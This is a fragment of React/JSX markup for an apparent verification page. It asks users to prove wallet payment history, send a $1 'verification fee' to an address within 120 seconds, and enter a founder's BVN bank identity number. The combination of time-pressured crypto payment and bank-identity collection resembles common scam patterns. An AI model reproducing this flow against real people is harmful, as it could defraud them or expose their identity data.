        ...
        <div className="content-body">
          <div className="contents">
            ...
            <p className="content-text">
              ...
              You are required to provide a wallet that has processed at least
              $500 worth recurrent payment in last 6 months.
            </p>
          </div>
          ...
          <div className="contents">
            ...
            <p className="content-text">
              ...
              As part of your verification you have to send a verification fee
              of $1 to this address from the address you pasted above within 120
              seconds
            </p>
          </div>
          ...
          <div className="contents">
            <input placeholder="Founder’s BVN" className="content-inputs" />
            <BsFillClipboardFill />
            <p className="content-text">
